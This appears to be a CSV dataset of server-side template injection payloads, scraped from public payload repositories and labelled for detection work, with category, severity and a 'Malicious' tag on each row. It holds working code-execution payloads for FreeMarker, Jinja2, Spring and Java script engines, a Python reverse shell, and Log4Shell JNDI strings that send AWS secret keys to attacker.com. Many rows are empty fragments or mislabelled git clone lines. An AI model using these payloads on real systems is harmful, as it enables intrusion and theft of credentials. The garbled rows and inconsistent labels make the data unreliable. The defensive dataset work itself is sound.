%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22id%22%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%7B%20ex%28%27id%27%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bapp.request.query.filter%280%2C0%2C1024%2C%7B%27options%27%3A%27system%27%7D%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27ls%27%29.read%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28request.args.input%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25endfor%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%24smarty.version%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7Bphp%7Decho%20%60id%60%3B%7B/php%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%5B%27id%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest%7Cattr%28%5Brequest.args.usc%2A2%2Crequest.args.class%2Crequest.args.usc%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest%7Cattr%28%5B%22_%22%2A2%2C%22class%22%2C%22_%22%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest%7Cattr%28%5B%22__%22%2C%22class%22%2C%22__%22%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest%7Cattr%28%22__class__%22%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest.__class__%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest%7Cattr%28%27application%27%29%7Cattr%28%27%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%27%29%28%27os%27%29%7Cattr%28%27popen%27%29%28%27id%27%29%7Cattr%28%27read%27%29%28%29%7D%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22new%20java.lang.String%28%27xxx%27%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22whoami%5C%5C%5C%22%29%3B%20x.start%28%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,High,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22netstat%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22uname%5C%5C%5C%22%2C%5C%5C%5C%22-a%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ip%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22/bin/cat%5C%22%2C%20%5C%22flag.txt%5C%22%5D%29%3B%27%22%29.read%28%29.zfill%28417%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7BT%28java.lang.System%29.getenv%28%29%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc/passwd%27%29%7D%0A,SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{2*2}}[[3*3]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{3*'3'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
<%= 3 * 3 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
${6*6},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
${{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
@(6+5),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
#{ 3 * 3 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{'a'.toUpperCase()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
root@ismailtasdelen:~# git clone git@github.com:payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{php}echo """,CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
",CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
        injection_entry += """"{{INJECTION_POINT}}/""""  # It will be renderred later with the payload.""",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"path = ""../../../../../../../../../../config/credentials.yml.enc{{""",DirTraversal_Path,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"path = ""../../../../../../../../../../config/master.key{{""",DirTraversal_Path,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"            req['Accept'] = ""../../../../../../../../../../tmp/result.txt{{""",DirTraversal_Path,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${java:version}.domain/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${env:JAVA_VERSION}.domain/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${sys:java.version}.domain/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${sys:java.vendor}.domain/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${hostName}.domain/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:dns://${hostName}.domain},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{3+3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",DirTraversal_Path,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"""healthCheckRegistry"": ""ldap://{{interactsh-url}}""",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([""0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446""].pack(""H*"")) rescue nil'; done",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
curl -H 'Referer: {{readFile """"etc/passwd""""}}' http://localhost/""",SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${7*7},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${{7*7}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${class.getClassLoader()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${class.getResource("""").getPath()}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${class.getResource(""../../../../../index.htm"").getContent()}",DirTraversal_Path,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join("" "")}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{'a'.toUpperCase()}} would result in 'A',SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ someString.toUPPERCASE() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% set cmd = 'id' %},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% set bytes = (1).TYPE,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ (1).TYPE,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${String x = new File('c:/windows/notepad.exe').text},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${String x = new File('/path/to/file').getText('UTF-8')},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${new File(""C:\Temp\FileName.txt"").createNewFile();}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${""http://www.google.com"".toURL().text}",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${new URL(""http://www.google.com"").getText()}",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${""calc.exe"".execute()}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${this.evaluate(""9*9"") //(this is a Script class)}",XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${7*7},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${request.getAttribute(""c"").add(""cmd.exe"")}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${request.getAttribute(""c"").add(""/k"")}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${request.getAttribute(""c"").add(""ping x.x.x.x"")}",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${request.getAttribute(""a"")}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${9*9},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${...},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",DirTraversal_Path,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
